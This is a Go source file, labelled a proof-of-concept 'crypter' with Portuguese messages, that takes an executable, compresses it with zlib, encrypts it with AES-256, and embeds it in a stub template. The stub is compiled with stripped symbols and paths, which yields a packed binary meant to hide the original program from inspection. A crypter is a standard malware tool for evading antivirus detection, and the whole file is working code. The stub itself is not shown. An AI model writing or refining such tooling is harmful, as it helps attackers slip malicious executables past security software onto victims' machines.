/*
	Poc crypter em Golang

	Autor: Pablo Skubert
*/

package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"strconv"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/pabloskubert/GoCrypter/pkg/aes"
	gpass "github.com/sethvargo/go-password/password"
)

const AES_KEY_LEGTH = 32

func main() {
	CWD, _ := os.Getwd()
	stubF := filepath.Join(CWD, "stub", "stub_template.go")


	if len(os.Args) < 2 {
		fmt.Printf("\n\n\t Uso: %s <executável> \n\n", filepath.Base(os.Args[0]))
		fmt.Printf("\n\n By: Pablo Skubert (deeman_est) \n\n")
		return;
	}

	encArq := os.Args[1]
	if _, err := os.Stat(encArq); err != nil {
		fmt.Printf("\n\n\t [!] Arquivo não encontrado: %s \n\n", filepath.Base(encArq))
	}

	if _, err := os.Stat(stubF); os.IsNotExist(err) {
		fmt.Printf("\n\t Template do stub não encontrado em: %s \n\n", stubF)
		return;
	}

	fmt.Printf("\n\t [+] Gerando chave AES 256-bit... \n\n")
	aesK, _ := gpass.Generate(AES_KEY_LEGTH, 10, 0, false, false)

	stub, _ := os.Open(stubF)
	stubB, _ := ioutil.ReadAll(stub)

	fmt.Printf("\n\t [+] Montando stub com base no template... \n\n")
	defer stub.Close()

	// Substitui a chave AES
	stubB = bytes.Replace(stubB, []byte("<KEY>"), []byte(aesK), -1)

	// Substitui a extensão
	stubB = bytes.Replace(stubB, []byte("<EXT>"), []byte(filepath.Ext(encArq)), -1)

	// Substitui o payload
	aesEnc := &aes.AesCrypto{
		Chave: aesK,
	}

	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Printf("\n\t [!] Erro ao gerar nonce: %s \n\n", err)
		return;
	}

	err := aesEnc.NewAesCrypto(nonce)
	if err != nil {
		panic(err)
	}

	fmt.Printf("\n\t [+] Comprimindo binário usando ZLIB... \n\n")

	var fbytes bytes.Buffer
	z, err := zlib.NewWriterLevel(&fbytes, zlib.BestCompression)
	if err != nil {
		panic(err)
	}

	encF, _ := os.Open(encArq)
	r := bufio.NewReader(encF)
	_, err = io.Copy(z, r)

	z.Close()
	encF.Close()

	if err != nil {
		fmt.Println("\n\t [!] Erro ao comprimir binário: ", err)
		return;
	}

	encFileBytes := aesEnc.Encriptar(fbytes.Bytes())
	encFileBytes = append(nonce, encFileBytes...)

	fmt.Printf("\n\t [+] Escrevendo binário no stub... \n\n")

	var fullPayload strings.Builder
	for _, b := range encFileBytes {

		fullPayload.WriteString(strconv.Itoa(int(b)))
		fullPayload.WriteByte(',')
	}

	stubB = bytes.Replace(stubB, []byte("/*PAYLOAD*/"), []byte(fullPayload.String()), -1)
	fullStub := filepath.Join(CWD, "stub", "main.go")
	gModStub := filepath.Join(CWD, "stub", "go.mod")

	ioutil.WriteFile(fullStub, stubB, 0644)

	fmt.Printf("\n\t [+] Compilando stub + payload... \n\n")
	os.Mkdir("gocrypter_out", 0755)

	otpF := filepath.Join(CWD, "gocrypter_out", filepath.Base(encArq)) 
	cmd := exec.Command("go", "build", "-ldflags", "-s -w", "-trimpath", "-modfile", gModStub ,"-o", otpF, fullStub)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()

	fmt.Printf("\n\t [+] Arquivo final criado em gocrypter_out\\%s \n\n", filepath.Base(otpF))
}